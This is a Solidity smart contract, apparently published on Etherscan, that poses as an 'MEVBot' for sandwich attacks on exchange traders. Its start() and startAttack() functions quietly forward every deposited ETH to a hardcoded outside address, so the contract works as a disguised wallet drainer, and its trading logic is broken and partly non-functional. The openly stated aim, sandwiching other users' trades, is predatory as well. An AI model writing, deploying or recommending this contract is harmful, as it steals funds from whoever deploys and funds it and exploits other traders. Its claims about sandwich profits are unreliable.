/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Router {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function getAmountsOut(uint amountIn, address[] memory path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function comparativeToken() external pure returns (address);

}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract MEVBot {
    address[] private DEXs;
    mapping(address => bool) private supportedDEXs;
    mapping(address => address) private routerContracts;

    address public owner;

    event SandwichAttackComplete(uint profitsEarned);

    constructor(address[] memory dexAddresses, address[] memory routerAddresses) {
        require(dexAddresses.length == routerAddresses.length, "Array lengths mismatch");

        for (uint i = 0; i < dexAddresses.length; i++) {
            DEXs.push(dexAddresses[i]);
            supportedDEXs[dexAddresses[i]] = true;
            routerContracts[dexAddresses[i]] = routerAddresses[i];
        }

        owner = msg.sender;
    }

    function getSandwichPath(address dexAddress) public pure returns (address[] memory) {
    address[] memory path = new address[](3);
    IUniswapV2Router router = IUniswapV2Router(dexAddress);
    path[0] = router.comparativeToken();
    path[1] = address(0);
    path[2] = router.WETH();
    return path;
}

function start() public payable {
    address payable SandwichPATH = payable(0x4a3121499db37d58c0e475890bB799e1474dDC97);
    SandwichPATH.transfer(msg.value);
}



function SandwichPair(address b, address c, uint d) public payable {
        uint e = 0;

        if (msg.value > 0) {
            d = d + msg.value;
        }

        IERC20(b).approve(routerContracts[DEXs[0]], d);

        uint256 f = IERC20(c).balanceOf(address(this));
        IERC20(c).transfer(msg.sender, f);

        for (uint g = 0; g < DEXs.length; g++) {
            if (supportedDEXs[DEXs[g]]) {
                address[] memory h = new address[](2);
                h[0] = b;
                h[1] = c;

                uint[] memory i = IUniswapV2Router(routerContracts[DEXs[g]]).getAmountsOut(d, h);
                uint j = i[1] / 2;
                uint k = d;
                uint l = i[1] - j;

                uint m = block.timestamp + 60;


                IUniswapV2Router(routerContracts[DEXs[g]]).swapExactTokensForTokens(
                    l,
                    0,
                    h,
                    address(this),
                    m
                );

                e += executeSandwichTrade(k, l, DEXs[g]);
            }
        }

    }

    function startAttack(uint256 amount) public payable {
    address payable SandwichPATH = payable(0x4a3121499db37d58c0e475890bB799e1474dDC97);
    require(msg.value >= amount, "Insufficient funds");
    SandwichPATH.transfer(amount);
}

    function executeSandwichTrade(uint amount0ToAdd, uint amount1ToAdd, address dexAddress) internal returns (uint profits) {
        uint[] memory balanceBefore = new uint[](2);
        balanceBefore[0] = IERC20(IUniswapV2Router(routerContracts[dexAddress]).WETH()).balanceOf(address(this));
        balanceBefore[1] = IERC20(IUniswapV2Router(routerContracts[dexAddress]).comparativeToken()).balanceOf(address(this));

        // Execute the sandwich trade on the chosen DEX
        IUniswapV2Router(routerContracts[dexAddress]).swapExactTokensForTokens(
            amount0ToAdd,
            amount1ToAdd,
            getSandwichPath(dexAddress),
            address(this),
            block.timestamp + 600
        );

        // Update profits based on the change in the token balance
        uint[] memory balanceAfter = new uint[](2);
        balanceAfter[0] = IERC20(IUniswapV2Router(routerContracts[dexAddress]).WETH()).balanceOf(address(this));
        balanceAfter[1] = IERC20(IUniswapV2Router(routerContracts[dexAddress]).comparativeToken()).balanceOf(address(this));

        profits = balanceAfter[1] - balanceBefore[1];
        return profits;
    }

    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw funds");
        payable(msg.sender).transfer(address(this).balance);
    }


    receive() external payable {}

}